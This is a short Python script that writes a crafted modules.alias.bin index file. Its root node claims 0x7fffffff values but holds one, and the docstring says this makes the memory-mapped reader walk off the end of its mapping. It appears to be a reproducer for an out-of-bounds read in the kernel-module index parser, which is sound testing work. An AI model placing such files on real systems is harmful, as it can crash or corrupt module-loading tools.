#!/usr/bin/env python3
"""gen_modules_dir.py <root>: write <root>/lib/modules/1.0/modules.*.bin where modules.alias.bin has a root node
(prefix "foo") claiming 0x7fffffff values but containing one; the mm reader walks off the end of the mapping."""
import os
import struct
import sys

MAGIC, VERSION = 0xB007F457, 0x00020001
F_PREFIX, F_VALUES = 0x80000000, 0x40000000
d = os.path.join(sys.argv[1], "lib/modules/1.0")
os.makedirs(d)
empty = struct.pack(">III", MAGIC, VERSION, 0) + b"\0" * 16
node = b"foo\0" + struct.pack(">I", 0x7FFFFFFF) + struct.pack(">I", 0) + b"x\0"
bad = struct.pack(">III", MAGIC, VERSION, 12 | F_PREFIX | F_VALUES) + node
for name in ("dep", "symbols", "builtin", "builtin.alias"):
    open(f"{d}/modules.{name}.bin", "wb").write(empty)
open(f"{d}/modules.alias.bin", "wb").write(bad)
